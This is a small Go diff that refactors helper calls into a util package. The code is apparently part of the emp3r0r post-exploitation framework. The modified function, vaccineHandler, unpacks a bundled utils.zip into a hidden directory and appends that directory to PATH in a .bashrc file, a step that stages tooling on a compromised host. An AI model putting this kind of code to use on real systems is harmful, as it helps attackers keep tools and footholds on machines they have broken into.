@@ -9,6 +9,7 @@ import (
 	"log"
 	"os"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archiver"
 )
 
@@ -22,7 +23,7 @@ func vaccineHandler() string {
 	}
 
 	// unpack utils.zip to our PATH
-	if !IsFileExist(UtilsPath) {
+	if !util.IsFileExist(UtilsPath) {
 		if err = os.MkdirAll(UtilsPath, 0700); err != nil {
 			log.Print(err)
 			return fmt.Sprintf("mkdir: %v", err)
@@ -36,8 +37,8 @@ func vaccineHandler() string {
 
 	// update PATH in .bashrc
 	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", UtilsPath)
-	if !IsStrInFile(exportPATH, UtilsPath+"/.bashrc") {
-		err = AppendToFile(UtilsPath+"/.bashrc", exportPATH)
+	if !util.IsStrInFile(exportPATH, UtilsPath+"/.bashrc") {
+		err = util.AppendToFile(UtilsPath+"/.bashrc", exportPATH)
 		if err != nil {
 			log.Printf("Update bashrc: %v", err)
 			out = fmt.Sprintf("Update bashrc: %v", err)
